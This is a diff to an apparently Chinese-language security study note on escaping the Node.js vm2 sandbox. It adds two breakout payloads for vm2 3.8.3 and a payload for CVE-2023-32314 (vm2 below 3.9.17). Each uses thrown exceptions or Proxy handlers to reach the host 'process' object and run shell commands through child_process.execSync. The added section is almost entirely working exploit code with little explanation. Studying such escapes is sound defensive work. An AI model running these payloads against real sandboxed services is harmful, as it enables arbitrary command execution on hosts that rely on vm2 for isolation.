@@ -201,6 +201,69 @@ vm2相比vm利用了es6新增的proxy特性，从而使用钩子拦截对`constr
 ![](attachments/d2976669ebe6f4cef93742b97c6ba3c.png)
 
 就会执行`Decontextify.instance()`函数然后这个函数抛出异常，因为这个异常是沙箱外的代码抛出的，所以在沙箱内拿到的异常对象是个外部对象
+
+### Breakout in v3.8.3
+```js
+"use strict";
+const {VM} = require('vm2');
+const untrusted = '(' + function(){
+	TypeError.prototype.get_process = f=>f.constructor("return process")();
+	try{
+		Object.preventExtensions(Buffer.from("")).a = 1;
+	}catch(e){
+		return e.get_process(()=>{}).mainModule.require("child_process").execSync("whoami").toString();
+	}
+}+')()';
+try{
+	console.log(new VM().run(untrusted));
+}catch(x){
+	console.log(x);
+}
+```
+
+```js
+"use strict";
+const {VM} = require('vm2');
+const untrusted = '(' + function(){
+	try{
+		Buffer.from(new Proxy({}, {
+			getOwnPropertyDescriptor(){
+				throw f=>f.constructor("return process")();
+			}
+		}));
+	}catch(e){
+		return e(()=>{}).mainModule.require("child_process").execSync("whoami").toString();
+	}
+}+')()';
+try{
+	console.log(new VM().run(untrusted));
+}catch(x){
+	console.log(x);
+}
+```
+### CVE-2023-32314
+vm2版本<3.9.17
+
+payload
+```JS
+cmd = "'''+cmd+'''";
+err = {};
+const handler = {
+getPrototypeOf(target) {
+    (function stack() {
+        new Error().stack;
+        stack();
+    })();
+    }
+};
+        
+const proxiedErr = new Proxy(err, handler);
+try {
+    throw proxiedErr;
+} catch ({constructor: c}) {
+    c.constructor('return process')().mainModule.require('child_process').execSync(cmd);
+}
+```
 ## 参考文章
 https://xz.aliyun.com/t/11859
 
